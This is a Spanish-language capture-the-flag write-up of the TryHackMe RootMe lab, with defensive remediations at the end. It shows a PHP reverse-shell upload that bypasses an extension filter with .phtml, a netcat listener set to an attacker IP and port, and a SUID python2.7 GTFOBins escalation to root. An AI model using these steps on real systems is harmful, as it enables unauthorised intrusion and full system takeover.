#  1. Laboratorio: RootMe (TryHackMe)

---

## Objetivo y Descripción del Laboratorio

### **Objetivo**
Comprometer por completo la máquina víctima obteniendo **acceso inicial** mediante la explotación de un servicio web, y posteriormente **escalar privilegios** hasta conseguir acceso como usuario `root`, capturando las dos flags que validan cada etapa:

* **User Flag:** `user.txt` (acceso inicial)
* **Root Flag:** `root.txt` (control total del sistema)

---

### **Descripción**
**RootMe** es una máquina de dificultad **Fácil**, orientada a practicar la metodología estándar de una prueba de penetración (*pentest*): reconocimiento, enumeración de servicios, descubrimiento de contenido web oculto, explotación de una vulnerabilidad de subida de archivos (*arbitrary file upload*) para obtener una shell reversa, y escalada de privilegios local abusando de binarios y configuraciones del sistema (técnicas GTFOBins).

##  Herramientas utilizadas

| Herramienta | Propósito |
|---|---|
| **Nmap** | Escaneo de puertos y detección de servicios/versiones (`-A -Pn -T5`) |
| **Gobuster** | Enumeración/fuzzing de directorios y archivos ocultos en el servidor web |
| **Firefox (navegador)** | Exploración manual del sitio web y del panel de subida de archivos |
| **revshells.com** | Generación del payload de reverse shell en PHP (plantilla PHP PentestMonkey) |
| **Netcat (`nc`)** | Listener para recibir la conexión de la reverse shell |
| **Python (`pty` module)** | Estabilización de la shell obtenida (TTY interactiva) |
| **find** | Búsqueda de binarios con permisos SUID para escalada de privilegios |
| **GTFOBins** | Consulta de técnicas de explotación para el binario SUID `python2.7` |
| **Python2.7 (SUID)** | Explotación local para escalar privilegios a `root` |

---

## Metodología y etapas del reconocimiento y explotación

###  Reconocimiento - Escaneo de puertos (Nmap)

Se realizó un escaneo agresivo sobre todos los puertos con tiempo de ejecución rápido (`-T5`), sin ping previo (`-Pn`) ya que algunos hosts de TryHackMe no responden a ICMP.

bash
nmap -A -Pn -T5 10.129.153.83


![alt text](<Captura de pantalla (130).png>)


**Análisis:**
- **Puerto 22/tcp** → SSH (OpenSSH 8.2p1) — posible vector de acceso una vez obtenidas credenciales.
- **Puerto 80/tcp** → Servidor web Apache 

---

### Enumeración web - Descubrimiento de directorios (Gobuster)

Se utilizó `gobuster` en modo `dir` contra el puerto 80, con el diccionario `directory-list-2.3-medium.txt` de `dirbuster`.


**Análisis:**
- `/uploads/` → posible directorio de subida de archivos, candidato para explotar una vulnerabilidad de *file upload*.
- `/panel/` → posible panel de administración, a revisar manualmente.
- `/css/` y `/js/` → recursos estáticos, sin interés inmediato.
- `/server-status` → bloqueado (403 Forbidden), sin acceso.

![alt text](<Captura de pantalla (132).png>)

------

### Panel de subida de archivos (`/panel/`)

Al acceder a `http://10.129.153.83/panel/` se encontró un formulario simple de carga de archivos:

- Botón **Browse...** para seleccionar un archivo.
- Botón **Upload** para enviarlo al servidor.

Este panel es el candidato principal para explotar una vulnerabilidad de **file upload** y obtener una *reverse shell*.

![alt text](<Captura de pantalla (133).png>)

___

### Generación de payload - Reverse Shell PHP

Se identificó que el panel de subida (`/panel/`) validaba los archivos únicamente por su **extensión**, sin verificar el contenido real del archivo. Esto permitió preparar una reverse shell en PHP para intentar subirla como `payload.phtml`, evadiendo así posibles filtros que bloquean la extensión `.php` directamente.

Se utilizó la plantilla **PHP PentestMonkey** desde [revshells.com](https://www.revshells.com), configurando la IP y puerto de escucha (listener):

\`\`\`php
$ip = '192.168.133.107';
$port = 9001;
\`\`\`

**Archivo generado:** `payload.phtml`

**Nota:** al usar la extensión `.phtml` (también interpretada como PHP por Apache) en lugar de `.php`, se busca sortear un filtro de subida basado solo en extensiones permitidas.

![alt text](<Captura de pantalla (138).png>)

___

###  Subida exitosa del payload

Se subió el archivo `payload.phtml` mediante el formulario de `/panel/`, recibiendo el mensaje de confirmación **"O arquivo foi upado com sucesso!"**, lo que indica que el filtro de extensión fue evadido correctamente.

![alt text](<Captura de pantalla (140).png>)



Al verificar el directorio `/uploads/` se confirmó que el archivo quedó alojado en el servidor:

\`\`\`
http://10.129.153.83/uploads/payload.phtml
\`\`\`

![alt text](<Captura de pantalla (144).png>)

___

### Obtención de shell y flag de usuario

Se levantó un listener con Netcat en el puerto `9001` y, al acceder a `http://10.129.153.83/uploads/payload.phtml` desde el navegador, se recibió la conexión de la reverse shell:

\`\`\`bash
nc -lvnp 9001
\`\`\`

**Resultado:**

\`\`\`
listening on [any] 9001 ...
connect to [192.168.133.107] from (UNKNOWN) [10.129.153.83] 45758
Linux ip-10-129-153-83 5.15.0-139-generic #149~20.04.1-Ubuntu SMP ... x86_64 GNU/Linux
\`\`\`

Se confirmó el usuario del proceso web y se localizó la primera flag:

\`\`\`bash
whoami
cd /var/www
ls
cat user.txt
\`\`\`

**Resultado:**

\`\`\`
www-data
html
user.txt

![](<Captura de pantalla (143).png>)

____

### Escalada de privilegios - Búsqueda de binarios SUID

Tras obtener la shell inicial, se estabilizó la terminal con una TTY interactiva y se buscaron binarios con el bit **SUID** activado, candidatos a explotación mediante **GTFOBins**:

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
find / -type f -perm -4000 2>/dev/null
\`\`\`

**Resultado relevante:**

\`\`\`
/usr/bin/python2.7
\`\`\`

**Análisis:**
Se encontró el binario `/usr/bin/python2.7` con permisos **SUID** activados, algo inusual ya que no es un binario estándar con ese bit. Según [GTFOBins](https://gtfobins.github.io/gtfobins/python2.7/), este binario puede ser utilizado para generar una shell con los privilegios del propietario del archivo (potencialmente `root`), aprovechando su capacidad de ejecutar código arbitrario.

____

![alt text](<Captura de pantalla (145).png>)
____

### Escalada de privilegios exitosa - Root

Aprovechando el bit SUID del binario `python2.7`, se ejecutó el exploit sugerido por GTFOBins para obtener una shell con privilegios elevados:

\`\`\`bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

El prompt cambió de `bash-5.0$` a `#`, confirmando acceso como **root**:

\`\`\`bash
pwd
cd /root
\`\`\`

**Resultado:**

\`\`\`
/var/www
/root
#
![alt text](<Captura de pantalla (146).png>)

----

## Vulnerabilidades encontradas y sus posibles impactos

### 1. Subida de archivos sin restricción real (Unrestricted File Upload)
**Descripción:** el panel `/panel/` validaba los archivos únicamente por extensión, sin verificar el contenido ni el tipo MIME real, permitiendo subir un archivo `.phtml` interpretado como PHP por Apache.

**Impacto:**
- Ejecución remota de código (**RCE**) en el servidor.
- Obtención de una shell interactiva con el usuario del servicio web (`www-data`).
- Punto de entrada inicial para todo el compromiso de la máquina.

---

### 2. Binario con permisos SUID mal configurado (`python2.7`)
**Descripción:** el binario `/usr/bin/python2.7` tenía activado el bit SUID (`-4000`), perteneciendo a `root`, permitiendo ejecutar código arbitrario con privilegios heredados del propietario.

**Impacto:**
- Escalada de privilegios local de `www-data` a `root`.
- Compromiso total del sistema (control absoluto sobre archivos, procesos y configuración).

---

### 3. Falta de segmentación de privilegios en el servicio web
**Descripción:** el usuario `www-data` tenía acceso de lectura/escritura a directorios y capacidad de interactuar con binarios sensibles del sistema sin restricciones adicionales (ej. AppArmor, SELinux, contenedores).

**Impacto:**
- Facilita el movimiento lateral dentro del sistema tras un compromiso inicial vía web.
- Amplía la superficie de ataque disponible para técnicas de post-explotación.

---

## Remediaciones recomendadas

| Vulnerabilidad | Remediación sugerida |
|---|---|
| Subida de archivos sin restricción | Validar el **tipo MIME real** del archivo (no solo la extensión), usar listas blancas estrictas de extensiones permitidas, renombrar archivos subidos y almacenarlos fuera del *webroot* o en un directorio sin permisos de ejecución. |
| Extensiones peligrosas aceptadas (`.phtml`) | Configurar Apache para no interpretar como PHP ninguna extensión fuera de `.php`, mediante la directiva `AddHandler`/`RemoveHandler` en la configuración del servidor. |
| Binario SUID innecesario (`python2.7`) | Eliminar el bit SUID de binarios que no lo requieren: `chmod u-s /usr/bin/python2.7`. Auditar periódicamente binarios con SUID mediante `find / -perm -4000`. |
| Privilegios excesivos del usuario del servicio web | Aplicar el principio de **mínimo privilegio**: restringir lo que `www-data` puede leer/ejecutar, usar `AppArmor`/`SELinux` y contenedores para aislar el servicio. |
| Falta de monitoreo | Implementar un **WAF** (Web Application Firewall) y herramientas de detección de intrusiones (IDS/HIDS) para alertar sobre subidas de archivos sospechosas o ejecuciones anómalas. |

---

## Conclusiones y aprendizajes obtenidos

La máquina **RootMe** permitió reforzar la metodología completa de un pentest de caja negra sobre una aplicación web, desde el reconocimiento inicial hasta la escalada de privilegios:

- Se evidenció la importancia de realizar un **escaneo de puertos y servicios** exhaustivo como primer paso, ya que reveló los dos únicos vectores de entrada disponibles (SSH y HTTP).
- La **enumeración de directorios** con Gobuster fue clave para descubrir funcionalidades ocultas (`/panel/`, `/uploads/`) no enlazadas desde la interfaz principal del sitio.
- Se comprobó en la práctica cómo una validación de archivos basada **solo en la extensión** es insuficiente y fácilmente evadible, resultando en una vulnerabilidad crítica de **ejecución remota de código**.
- La fase de **post-explotación** reforzó la importancia de enumerar sistemáticamente el sistema (binarios SUID, permisos, procesos) en busca de configuraciones erróneas que faciliten la escalada de privilegios.
- Se reafirmó el valor de recursos como **GTFOBins** para identificar rápidamente técnicas de explotación conocidas sobre binarios legítimos mal configurados.

En conjunto, este laboratorio consolidó conocimientos prácticos sobre **OWASP Top 10** (específicamente *Broken Access Control* y *Security Misconfiguration*) y sobre técnicas reales de escalada de privilegios en entornos Linux, útiles tanto para pentesting ofensivo como para el hardening defensivo de servidores web.